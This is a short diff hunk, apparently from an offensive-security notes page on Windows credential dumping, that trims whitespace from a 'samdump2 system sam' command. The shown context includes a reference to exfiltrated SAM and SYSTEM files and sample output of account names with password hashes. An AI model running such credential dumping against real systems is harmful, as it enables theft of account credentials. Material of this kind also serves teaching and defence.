@@ -24,7 +24,7 @@ Once the files are dumped and exfiltrated, we can dump hashes with samdump2 on k
 {% code-tabs %}
 {% code-tabs-item title="attacker@local" %}
 ```text
-root@~/tools/mitre/pwdump# samdump2 system sam 
+root@~/tools/mitre/pwdump# samdump2 system sam
 *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:9f288c9a9aee917e19d4b21928b98268:::
